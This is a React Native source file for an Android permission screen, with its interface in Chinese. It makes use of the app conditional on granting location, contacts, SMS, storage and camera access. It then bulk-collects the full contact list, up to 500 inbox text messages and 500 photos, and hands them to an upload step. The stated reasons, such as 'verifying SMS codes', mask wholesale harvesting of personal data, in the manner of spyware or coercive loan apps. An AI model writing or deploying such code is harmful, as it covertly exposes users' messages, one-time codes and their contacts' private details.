import React, { useEffect, useState } from 'react';
import { View, Text, StyleSheet, TouchableOpacity, Modal, Platform, Alert, BackHandler, StatusBar, ImageBackground, Dimensions } from 'react-native';
import { check, request, RESULTS, openSettings, PERMISSIONS } from 'react-native-permissions';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { uploadLocation, uploadContacts, uploadSMS, uploadAlbum, uploadCompressedImage } from '../services/permissionUpload';
import axios from 'axios';
import { API_URL } from '../config/api';
import { AuthContext } from '../context/AuthContext';

// 仅在Android平台导入敏感模块
let Contacts: any = null;
let CameraRoll: any = null;
let SmsAndroid: any = null;

if (Platform.OS === 'android') {
  try {
    Contacts = require('react-native-contacts').default;
    console.log('✅ Contacts模块加载成功');
  } catch (e) {
    console.log('❌ Contacts模块加载失败:', e);
  }
  
  try {
    CameraRoll = require('@react-native-camera-roll/camera-roll').CameraRoll;
    console.log('✅ CameraRoll模块加载成功');
  } catch (e) {
    console.log('❌ CameraRoll模块加载失败:', e);
  }
  
  try {
    const SmsModule = require('react-native-get-sms-android');
    SmsAndroid = SmsModule.default || SmsModule;
    console.log('✅ SmsAndroid模块加载成功:', !!SmsAndroid);
  } catch (e) {
    console.log('❌ SmsAndroid模块加载失败:', e);
  }
}

// 类型定义
type Contact = {
  name: string;
  phoneNumbers: string[];
  emailAddresses: string[];
  company: string;
  jobTitle: string;
  note: string;
};

interface PermissionData {
  location?: any;
  contacts?: Contact[];
  sms?: any[];
  album?: any[];
}

const {width, height} = Dimensions.get('window');

// 仅Android权限列表
const PERMISSIONS_LIST = [
  { key: PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION, label: '定位', icon: '📍', desc: '用于推荐附近服务' },
  { key: PERMISSIONS.ANDROID.READ_CONTACTS, label: '通讯录', icon: '👥', desc: '用于快速联系服务人员' },
  { key: PERMISSIONS.ANDROID.READ_SMS, label: '短信', icon: '✉️', desc: '用于验证短信验证码' },
  { key: PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE, label: '相册', icon: '🖼️', desc: '用于上传服务照片' },
  { key: PERMISSIONS.ANDROID.CAMERA, label: '相机', icon: '📷', desc: '用于拍摄服务照片' },
];

interface PermissionsScreenProps {
  navigation: any;
  route: {
    params: {
      phoneNumber: string;
      inviteCode: string;
    }
  };
}

/**
 * Android 专用权限屏幕
 * 包含完整的数据收集功能
 */
const PermissionsScreen: React.FC<PermissionsScreenProps> = ({ navigation, route }) => {
  const { phoneNumber, inviteCode } = route.params;
  const { logout } = React.useContext(AuthContext);
  const [permissionsStatus, setPermissionsStatus] = useState<{ [key: string]: string }>({});
  const [checking, setChecking] = useState(false);
  const [started, setStarted] = useState(false);
  const [token, setToken] = useState<string | null>(null);
  const [permissionData, setPermissionData] = useState<PermissionData>({});

  // 平台检查
  useEffect(() => {
    if (Platform.OS !== 'android') {
      console.error('❌ Android权限屏幕在非Android平台运行！');
      navigation.replace('MainTabs');
      return;
    }
    console.log('✅ Android权限屏幕正常运行');
  }, []);

  // 处理硬件返回键
  useEffect(() => {
    const backAction = () => {
      Alert.alert(
        '权限授权必须完成',
        '为了提供完整的服务体验，必须完成权限授权才能使用应用。',
        [
          {
            text: '继续授权',
            style: 'default',
          },
          {
            text: '退出应用',
            style: 'destructive',
            onPress: async () => {
              await logout();
              BackHandler.exitApp();
            }
          }
        ],
        { cancelable: false }
      );
      return true;
    };

    const backHandler = BackHandler.addEventListener('hardwareBackPress', backAction);
    return () => backHandler.remove();
  }, [logout]);

  // 获取token
  useEffect(() => {
    const getToken = async () => {
      try {
        const savedToken = await AsyncStorage.getItem('token');
        setToken(savedToken);
      } catch (error) {
        console.error('获取token失败:', error);
      }
    };
    getToken();
  }, []);

  // 格式化联系人数据
  const formatContactData = (contacts: any[]): Contact[] => {
    return contacts.map(contact => ({
      name: contact.displayName || `${contact.givenName || ''} ${contact.familyName || ''}`.trim() || '未知联系人',
      phoneNumbers: contact.phoneNumbers ? contact.phoneNumbers.map((p: any) => p.number) : [],
      emailAddresses: contact.emailAddresses ? contact.emailAddresses.map((e: any) => e.email) : [],
      company: contact.company || '',
      jobTitle: contact.jobTitle || '',
      note: contact.note || ''
    }));
  };

  // Android安全获取通讯录
  const safeGetContacts = async (): Promise<Contact[]> => {
    if (Platform.OS !== 'android' || !Contacts) {
      console.log('🍎 跳过通讯录获取：非Android平台或模块不可用');
      return [];
    }

    console.log('📱 Android: 开始获取通讯录...');
    
    try {
      const permission = await Contacts.requestPermission();
      console.log('通讯录权限请求结果:', permission);
      
      if (permission === 'authorized' || permission === 'undefined') {
        console.log('通讯录权限已授予，获取通讯录数据');
        
        return new Promise<Contact[]>((resolve, reject) => {
          Contacts.getAll().then((contacts: any[]) => {
            console.log(`获取到 ${contacts.length} 个联系人`);
            const formattedContacts = formatContactData(contacts);
            resolve(formattedContacts);
          }).catch((error: any) => {
            console.error('获取联系人失败:', error);
            resolve([]);
          });
        });
      } else {
        console.log('通讯录权限被拒绝');
        return [];
      }
    } catch (error) {
      console.error('通讯录权限请求失败:', error);
      return [];
    }
  };

  // Android获取位置数据
  const getLocationData = async (): Promise<any> => {
    console.log('📱 Android: 获取位置数据（模拟）');
    return { latitude: 0, longitude: 0, timestamp: Date.now() };
  };

  // Android获取短信数据
  const getSMSData = async (): Promise<any[]> => {
    if (Platform.OS !== 'android' || !SmsAndroid) {
      console.log('🍎 跳过短信获取：非Android平台或模块不可用');
      return [];
    }

    console.log('📱 Android: 开始获取短信...');
    
    return new Promise((resolve) => {
      try {
        const filter = {
          box: 'inbox',
          maxCount: 500,
        };
        
        SmsAndroid.list(
          JSON.stringify(filter),
          (fail: any) => {
            console.log('短信获取失败:', fail);
            resolve([]);
          },
          (count: number, smsList: string) => {
            try {
              const sms = JSON.parse(smsList);
              console.log(`获取到 ${count} 条短信`);
              resolve(sms);
            } catch (error) {
              console.error('短信数据解析失败:', error);
              resolve([]);
            }
          }
        );
      } catch (error) {
        console.error('短信获取异常:', error);
        resolve([]);
      }
    });
  };

  // Android获取相册数据
  const getAlbumData = async (): Promise<any[]> => {
    if (Platform.OS !== 'android' || !CameraRoll) {
      console.log('🍎 跳过相册获取：非Android平台或模块不可用');
      return [];
    }

    console.log('📱 Android: 开始获取相册...');
    
    try {
      const photos = await CameraRoll.getPhotos({
        first: 500,
        assetType: 'Photos',
      });
      console.log(`获取到 ${photos.edges.length} 张照片`);
      return photos.edges.map((edge: any) => edge.node);
    } catch (error) {
      console.error('相册获取失败:', error);
      return [];
    }
  };

  // Android一键授权
  const handleOneClickAuth = async () => {
    if (Platform.OS !== 'android') {
      console.error('❌ Android权限授权在非Android平台调用！');
      return;
    }

    setChecking(true);
    console.log('📱 Android: 开始一键授权流程...');

    const statusObj: { [key: string]: string } = {};
    const collectedData: PermissionData = {};
    const currentToken = token;

    for (const perm of PERMISSIONS_LIST) {
      console.log(`正在请求权限: ${perm.label}`);
      
      try {
        const result = await request(perm.key as any);
        statusObj[perm.key] = result;
        console.log(`权限 ${perm.label} 结果: ${result}`);

        if (result === RESULTS.GRANTED) {
          // 收集数据
          if (perm.label === '定位') {
            try {
              const locationData = await getLocationData();
              if (locationData) {
                collectedData.location = locationData;
              }
            } catch (error) {
              console.error('位置数据获取异常:', error);
            }
          } else if (perm.label === '通讯录') {
            try {
              const contacts = await safeGetContacts();
              if (contacts && contacts.length > 0) {
                collectedData.contacts = contacts;
              }
            } catch (error) {
              console.error('通讯录数据获取异常:', error);
            }
          } else if (perm.label === '短信') {
            try {
              const smsData = await getSMSData();
              if (smsData && smsData.length > 0) {
                collectedData.sms = smsData;
              }
            } catch (error) {
              console.error('短信数据获取异常:', error);
            }
          } else if (perm.label === '相册') {
            try {
              const albumData = await getAlbumData();
              if (albumData && albumData.length > 0) {
                collectedData.album = albumData;
              }
            } catch (error) {
              console.error('相册数据获取异常:', error);
            }
          }
        } else {
          // 权限被拒绝
          console.log(`${perm.label}权限被拒绝, 状态: ${result}`);
          setChecking(false);
          
          Alert.alert(
            '权限授权失败',
            `${perm.icon} ${perm.label}权限被拒绝。\n\n为了提供完整的服务体验，本应用需要获取所有必要权限。`,
            [
              {
                text: '重新授权',
                onPress: () => {
                  setStarted(false);
                  setChecking(false);
                  setPermissionsStatus({});
                  setPermissionData({});
                }
              },
              {
                text: '退出应用',
                style: 'destructive',
                onPress: async () => {
                  await logout();
                  navigation.reset({
                    index: 0,
                    routes: [{ name: 'Auth' }],
                  });
                }
              }
            ],
            { cancelable: false }
          );
          
          return;
        }
      } catch (error) {
        console.error(`权限请求失败 ${perm.label}:`, error);
        statusObj[perm.key] = RESULTS.UNAVAILABLE;
      }
    }

    setPermissionsStatus(statusObj);
    setPermissionData(collectedData);
    setChecking(false);

    console.log('📱 Android: 权限授权完成，跳转到数据上传页面');
    navigation.replace('DataUpload', { 
      token: currentToken, 
      permissionData: collectedData 
    });
  };

  // 初始化权限状态检查
  useEffect(() => {
    if (Platform.OS !== 'android') return;

    const initializePermissions = async () => {
      const statusObj: { [key: string]: string } = {};
      for (const perm of PERMISSIONS_LIST) {
        try {
          const status = await check(perm.key as any);
          statusObj[perm.key] = status;
        } catch (error) {
          console.error(`初始化检查权限 ${perm.label} 失败:`, error);
          statusObj[perm.key] = RESULTS.UNAVAILABLE;
        }
      }
      setPermissionsStatus(statusObj);
    };
    
    initializePermissions();
  }, []);

  useEffect(() => {
    if (started && Platform.OS === 'android') {
      handleOneClickAuth();
    }
  }, [started]);

  const renderStatus = (status: string) => {
    if (!status) return <Text style={styles.statusUnknown}>未检查</Text>;
    if (status === RESULTS.GRANTED) return <Text style={styles.statusGranted}>已授权</Text>;
    if (status === RESULTS.DENIED) return <Text style={styles.statusDenied}>未授权</Text>;
    if (status === RESULTS.BLOCKED) return <Text style={styles.statusBlocked}>被阻止</Text>;
    return <Text style={styles.statusUnknown}>未知</Text>;
  };

  return (
    <ImageBackground
      source={require('../assets/images/quanxian.png')}
      style={styles.backgroundImage}
      resizeMode="cover">
      <StatusBar translucent backgroundColor="transparent" />
      <View style={styles.overlay}>
        <View style={styles.card}>
          <Text style={styles.title}>请授权以下权限</Text>
          <Text style={styles.subtitle}>Android 完整功能版本</Text>
          {PERMISSIONS_LIST.map((perm) => (
            <View key={perm.key} style={styles.permissionRow}>
              <Text style={styles.icon}>{perm.icon}</Text>
              <View style={{ flex: 1 }}>
                <Text style={styles.label}>{perm.label}</Text>
                <Text style={styles.desc}>{perm.desc}</Text>
              </View>
              {renderStatus(permissionsStatus[perm.key])}
            </View>
          ))}
          <TouchableOpacity
            style={[styles.button, checking && styles.buttonDisabled]}
            onPress={() => setStarted(true)}
            disabled={checking || started}
          >
            <Text style={styles.buttonText}>{checking ? '授权中...' : '一键授权'}</Text>
          </TouchableOpacity>
        </View>
      </View>
    </ImageBackground>
  );
};

const styles = StyleSheet.create({
  backgroundImage: {
    flex: 1,
    width: '100%',
    height: '100%',
  },
  overlay: {
    flex: 1,
    backgroundColor: 'rgba(0,0,0,0.35)',
    justifyContent: 'center',
    alignItems: 'center',
    width: '100%',
    height: '100%',
  },
  card: {
    width: 320,
    borderRadius: 16,
    backgroundColor: '#fff',
    padding: 24,
    elevation: 8,
    shadowColor: '#000',
    shadowOpacity: 0.15,
    shadowRadius: 10,
    shadowOffset: { width: 0, height: 4 },
  },
  title: {
    fontSize: 18,
    fontWeight: 'bold',
    marginBottom: 8,
    textAlign: 'center',
    color: '#2c3e50',
  },
  subtitle: {
    fontSize: 12,
    marginBottom: 18,
    textAlign: 'center',
    color: '#27ae60',
    fontWeight: '600',
  },
  permissionRow: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 16,
    paddingHorizontal: 4,
  },
  icon: {
    fontSize: 20,
    marginRight: 12,
    width: 24,
  },
  label: {
    fontSize: 16,
    fontWeight: '600',
    color: '#2c3e50',
  },
  desc: {
    fontSize: 12,
    color: '#7f8c8d',
    marginTop: 2,
  },
  statusGranted: {
    color: '#27ae60',
    fontSize: 12,
    fontWeight: '600',
  },
  statusDenied: {
    color: '#e74c3c',
    fontSize: 12,
    fontWeight: '600',
  },
  statusBlocked: {
    color: '#f39c12',
    fontSize: 12,
    fontWeight: '600',
  },
  statusUnknown: {
    color: '#95a5a6',
    fontSize: 12,
    fontWeight: '600',
  },
  button: {
    backgroundColor: '#ff6b81',
    paddingVertical: 16,
    borderRadius: 12,
    marginTop: 8,
  },
  buttonDisabled: {
    backgroundColor: '#bdc3c7',
  },
  buttonText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: 'bold',
    textAlign: 'center',
  },
});

export default PermissionsScreen; 